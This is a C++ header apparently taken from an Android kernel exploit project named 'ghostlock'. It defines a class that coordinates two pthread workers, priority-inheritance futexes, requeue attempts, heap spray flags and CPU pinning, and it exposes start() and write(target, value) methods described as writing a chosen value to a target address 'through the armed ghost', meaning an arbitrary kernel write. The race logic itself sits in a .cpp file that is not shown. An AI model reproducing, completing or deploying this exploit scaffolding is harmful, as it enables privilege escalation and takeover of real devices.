#ifndef MULTICAST_WAITER_ROUTE_H
#define MULTICAST_WAITER_ROUTE_H

#include "memory/payload_builder.h"
#include "race/pi_race.h"
#include "profile/model.h"
#include "route/route_status.h"

#include <pthread.h>
#include <atomic>
#include <cstdint>

/* Resident multicast waiter lifecycle (CPP13).
 *
 * The route owns the resident socket and the two worker pthreads; every field
 * starts zeroed by init() and the status starts as ROUTE_RETRYABLE. The
 * validated order is fixed:
 *   disarm  -> stop_requested, drop consumer_go, wait for consumer_inflight,
 *              then mark kernel_disarmed;
 *   destroy -> join waiter, join owner, close the socket, mark userspace_clean
 *              and downgrade a non-OK armed route to ROUTE_FALLBACK_SAFE.
 * The one-shot route keeps its own small stack frame in
 * do_kernel5_fake_lock_route() and shares only the pure payload encoding.
 * The process-level resident lives in multicast_waiter_route.cpp and is
 * reached through resident_route(); the kernel5_resident_* wrappers in
 * multicast_waiter_route.cpp forward to this class. */
namespace ghostlock::route::multicast_waiter {
    enum class ResidentState : uint8_t {
        Empty = 0,
        WorkersStarted,
        RequeueAttempted,
        Armed,
        Disarmed,
        Destroyed,
    };

    [[nodiscard]] constexpr bool can_rollback_prearm(ResidentState state) noexcept {
        return state == ResidentState::Empty ||
               state == ResidentState::WorkersStarted;
    }

    [[nodiscard]] constexpr bool requires_fail_stop(ResidentState state) noexcept {
        return state == ResidentState::RequeueAttempted ||
               state == ResidentState::Armed ||
               state == ResidentState::Disarmed;
    }

    class MulticastWaiterRoute final {
    public:
        MulticastWaiterRoute() noexcept = default;

        ~MulticastWaiterRoute() noexcept = default;

        MulticastWaiterRoute(const MulticastWaiterRoute &) = delete;

        MulticastWaiterRoute &operator=(const MulticastWaiterRoute &) = delete;

        /* Host-safe: the fixed-vector test constructs a context and calls init()
   * without linking the Android-only implementation unit. */
        void init(ghostlock::race::PiRace *race_value, const ghostlock::memory::WriteRequest *request_value,
                  const ghostlock::profile::TargetProfile *profile_value,
                  ghostlock::profile::MulticastWaiterLayout layout_value, int32_t resident_value) noexcept {
            race = race_value;
            request = request_value;
            profile = profile_value;
            layout = layout_value;
            lock1_futex = 0;
            lock2_futex = 0;
            condition_futex = 0;
            owner_worker = {};
            waiter_worker = {};
            owner_worker_started = 0;
            waiter_worker_started = 0;
            target = 0;
            value = 0;
            lock = 0;
            task = 0;
            socket_fd = -1;
            main_cpu = race ? race->main_cpu : 0;
            consumer_cpu = race ? race->consumer_cpu : 0;
            scheduler_policy = 0; /* SCHED_NORMAL/SCHED_OTHER */
            resident = resident_value;
            ready = 0;
            lock_slot = 0;
            status = {};
            status.code = ghostlock::route::ROUTE_RETRYABLE;
            state = ResidentState::Empty;
            waiter_has_lock2.store(0, std::memory_order_relaxed);
            owner_has_lock1.store(0, std::memory_order_relaxed);
            waiter_waiting.store(0, std::memory_order_relaxed);
            owner_waiting.store(0, std::memory_order_relaxed);
            waiter_ready.store(0, std::memory_order_relaxed);
            respray_requested.store(0, std::memory_order_relaxed);
            sprayed.store(0, std::memory_order_relaxed);
            stop_requested.store(0, std::memory_order_relaxed);
            owner_done.store(0, std::memory_order_relaxed);
            waiter_tid.store(0, std::memory_order_relaxed);
        }

        /* Arm the resident (waiter and owner workers plus the retry socket), write
   * one target through the armed ghost, and join the workers again.
   * Implemented in multicast_waiter_route.cpp; the pthread workers stay
   * file-local there. */
        [[nodiscard]] int32_t start() noexcept;

        [[nodiscard]] int32_t write(uintptr_t target, uintptr_t value) noexcept;

        void stop() noexcept;

        /* Fields stay public: the workers read and write them from their hot loops,
   * preserving the pre-class access shape and field order. */
        ghostlock::race::PiRace *race;
        const ghostlock::memory::WriteRequest *request;
        const ghostlock::profile::TargetProfile *profile = nullptr;
        ghostlock::profile::MulticastWaiterLayout layout;
        uint32_t lock1_futex, lock2_futex, condition_futex;
        pthread_t owner_worker, waiter_worker;
        int32_t owner_worker_started, waiter_worker_started;
        std::atomic<int32_t> waiter_has_lock2, owner_has_lock1;
        std::atomic<int32_t> waiter_waiting, owner_waiting, waiter_ready;
        std::atomic<int32_t> respray_requested, sprayed, stop_requested;
        std::atomic<int32_t> owner_done, waiter_tid;
        uintptr_t target, value, lock, task;
        int32_t socket_fd;
        int32_t ready, scheduler_policy, lock_slot;
        int32_t main_cpu, consumer_cpu;
        int32_t resident;
        ghostlock::route::RouteStatus status;
        ResidentState state = ResidentState::Empty;
    };

    /* Process-level resident owner. */
    MulticastWaiterRoute &resident_route(void);
} // namespace ghostlock::route::multicast_waiter

#endif
